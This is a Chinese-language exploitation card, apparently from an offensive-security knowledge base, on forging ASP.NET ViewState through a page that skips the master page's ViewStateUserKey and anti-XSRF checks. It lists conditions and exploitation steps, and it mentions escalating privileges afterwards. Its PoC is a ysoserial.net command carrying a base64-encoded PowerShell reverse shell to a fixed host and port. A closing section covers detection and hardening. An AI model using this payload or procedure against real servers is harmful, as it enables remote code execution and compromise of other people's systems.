---
id: web-dotnet-deser-viewstate-userkey-masterpage-bypass
title: ASP.NET ViewStateUserKey/Anti-XSRF 防护绕过：选择未继承母版页的 Download.aspx 伪造 ViewState
type: scenario
domain: web
path: web/dotnet/deserialization
technique: viewstate-userkey-masterpage-missing-bypass
aliases:
- ViewStateUserKey 绕过
- Anti-XSRF 绕过
- Download.aspx ViewState
- machineKey ViewState
- ysoserial --path
- Site.master 绕过
- 未继承母版页
tags:
- dotnet
- aspnet
- viewstate
- machinekey
- viewstateuserkey
- anti-xsrf
- deserialization
- ysoserial
- iis
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V194
  verified_at: '2026-11-06T22:45:09+08:00'
  notes: 已对照原文与61张图核对：Web.config machineKey、Site.master Page_Init 设置 ViewStateUserKey、Page_PreLoad 校验 __AntiXsrfToken/__AntiXsrfUserName、Download.aspx 无 MasterPageFile、ysoserial --path=/Download.aspx 反弹 iis apppool 均与截图一致；与既有 machineKey 卡差异为‘页面未继承母版页导致 ViewStateUserKey/Anti-XSRF 校验缺失’这一触发条件与 --path 用法，确认 --force 合理。未复跑 PoC。
---

## 一句话结论

站点虽然设置了 `Page.ViewStateUserKey` 和 Anti-XSRF 令牌校验，但只要存在一个没有设置 `MasterPageFile`、不经过母版页防护代码的页面（如 `Download.aspx`），攻击者用泄露的 `machineKey` 配合 ysoserial.net 的 `--path` 参数把 ViewState 绑定到该页面，就能绕过用户绑定与反序列化后校验，在 IIS 应用池身份下执行命令。

## 原理

- ASP.NET Web Forms 的 ViewState 由 `machineKey` 做 MAC 签名（必要时加密）。如果页面还设置了 `Page.ViewStateUserKey`，该值会参与 MAC 计算，使 ViewState 与特定用户/会话绑定；即使攻击者拿到 `machineKey`，没有对应用户的 Cookie 也无法伪造出通过校验的 ViewState。
- 常见实现是在母版页 `Site.master` 的 `Page_Init` 中把 `Page.ViewStateUserKey` 设为 Anti-XSRF Cookie 的值，并在 `Page_PreLoad` 中校验 `ViewState["__AntiXsrfToken"]` 等于 Cookie、`ViewState["__AntiXsrfUserName"]` 等于当前用户名。这样即使伪造的 ViewState 通过了 MAC，反序列化后的业务校验也会拒绝。
- 漏洞点在于：这套防护写在母版页的代码隐藏文件里。某个页面只要没有写 `MasterPageFile="~/Site.master"`，就不会执行母版页的 `Page_Init`/`Page_PreLoad`，既不会设置 `ViewStateUserKey`，也不会做 Anti-XSRF 校验。文章中的 `Download.aspx` 正是这种“漏网”页面（只有 `CodeFile`/`Inherits`，没有 `MasterPageFile`）。
- ysoserial.net 的 ViewState 插件支持 `--path`/`--apppath` 参数，用于把 payload 绑定到目标页面路径；对 `Download.aspx` 生成签名时，页面路径与 MAC 的 purpose 匹配，服务端按该页面的规则验证通过。
- 由于 `Download.aspx` 没有用户绑定，攻击者不需要受害者的 Anti-XSRF Cookie 或用户名，只需要 `machineKey` 即可完成“签名合法 + 页面校验缺失”的组合，随后 `TextFormattingRunProperties` gadget 在反序列化时执行命令。

## 触发条件

- 目标为 ASP.NET Web Forms 站点，存在 `__VIEWSTATE` 并会在 POST 时反序列化。
- 已通过源码包、备份、FTP 匿名目录、路径遍历等方式获取 `Web.config`，拿到 `validationKey`/`decryptionKey` 与算法。
- 站点通过母版页实现了 `ViewStateUserKey` 或 Anti-XSRF 校验，但至少有一个可 POST 的 `.aspx` 页面未继承该母版页（或未执行等价校验）。
- 目标服务器存在 ysoserial.net 所需 gadget 程序集（如 `Microsoft.VisualStudio.Text.Formatting`），或可换用其他 gadget。
- 攻击者可访问该页面，且页面不要求登录（或攻击者已有低权限会话）。

## 利用步骤

1. **获取源码与密钥**：从匿名 FTP、备份目录、源码包或路径遍历中读取 `Web.config`，提取 `machineKey` 的 `decryption`、`decryptionKey`、`validation`、`validationKey`。
2. **确认防护逻辑**：查看 `Site.master.cs`，确认 `Page.ViewStateUserKey` 与 `Page_PreLoad` 中的 Anti-XSRF 校验；确认绝大多数页面通过 `MasterPageFile="~/Site.master"` 引入。
3. **寻找漏网页面**：搜索所有 `.aspx` 的 `MasterPageFile`，找出没有继承母版页的页面；文章中的 `Download.aspx` 只有 `<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Download.aspx.cs" Inherits="Download" %>`。
4. **生成 payload**：用 ysoserial.net 的 ViewState 插件，指定 `--path="/Download.aspx"`、`--apppath="/"`，并填入泄露的 `machineKey`：
   ```powershell
   .\ysoserial.exe -p ViewState -g TextFormattingRunProperties `
     -c "powershell -e <base64 反弹 shell>" `
     --path="/Download.aspx" --apppath="/" `
     --decryptionalg="AES" --decryptionkey="<decryptionKey>" `
     --validationalg="SHA1" --validationkey="<validationKey>"
   ```
5. **发送 POST**：把生成的字符串作为 `__VIEWSTATE` POST 到 `/Download`；页面不执行母版页校验，ViewState 被反序列化，gadget 执行命令。
6. **确认权限**：反弹 shell 的身份为 IIS 应用池账户（文章为 `iis apppool\intrafetch web site`）；随后可结合 `SeImpersonatePrivilege` 等继续提权。

## PoC

关键请求：

```http
POST /Download HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

__VIEWSTATE=<ysoserial生成的payload>
```

生成命令（占位密钥，实际使用泄露值）：

```powershell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties `
  -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAyADIALgAyADAALgAxADEAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" `
  --path="/Download.aspx" --apppath="/" `
  --decryptionalg="AES" --decryptionkey="<decryptionKey>" `
  --validationalg="SHA1" --validationkey="<validationKey>"
```

原文通过该方式获得 `iis apppool\intrafetch web site` 的反弹 shell；PoC 未在本机复跑，密钥与路径需按目标替换。

## 变体与关联

- 变体：如果漏网页面仍调用 `ViewStateUserKey`，可寻找只做 MAC、不做反序列化后业务校验的页面；或者使用未启用 ViewState MAC 的旧页面。
- 变体：如果没有 `--path` 参数，也可用 `--generator` 匹配页面的 `__VIEWSTATEGENERATOR`；不同 ysoserial.net 版本参数名略有差异。
- 关联：基础的 machineKey ViewState 伪造见 [[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]；MachineKey 通过路径遍历/备份泄露的前置步骤见 [[web-generic-file-inclusion-aspx-report-param-traversal-webconfig]]。
- 关联：其他 .NET 反序列化入口见 [[web-dotnet-deser-u9-datatransfer-binaryformatter-rce]]、[[web-dotnet-deser-erp-openserverdialog-binaryformatter-rce]]。
- 边界：站点全部页面都继承母版页、母版页防护在 `Global.asax`/HttpModule 全局注册、machineKey 每机不同且无法获取、或页面禁用 ViewState 时，本路径不成立。

## 检测与防御

- **保护 machineKey**：不要把 `Web.config` 放进可匿名下载的 FTP/备份/源码包；对站点目录做 ACL 与下载白名单；定期轮换 `machineKey`。
- **全局防护**：不要只在母版页实现 `ViewStateUserKey`/Anti-XSRF；在 `Global.asax` 的 `Application_PreRequestHandlerExecute` 或自定义 `IHttpModule` 中对所有页面统一设置 `ViewStateUserKey` 并校验令牌，确保没有页面能绕过。
- **页面一致性**：审计所有 `.aspx` 的 `MasterPageFile`，对未继承母版页的页面逐个确认是否设置了等价防护；不需要 ViewState 的页面设置 `EnableViewState="false"`。
- **检测**：POST 中出现异常长/非正常 Base64 的 `__VIEWSTATE`；`w3wp.exe` 派生 `cmd.exe`/`powershell.exe`；IIS 日志中出现针对 `Download.aspx` 等非表单页面的异常 POST；ViewState MAC 校验失败/反序列化异常集中出现。
- **加固**：启用 `enableViewStateMac=true` 与 `ViewStateEncryptionMode=Always`；升级 .NET Framework；新应用优先使用 ASP.NET Core/MVC，减少 WebForms ViewState 入口。
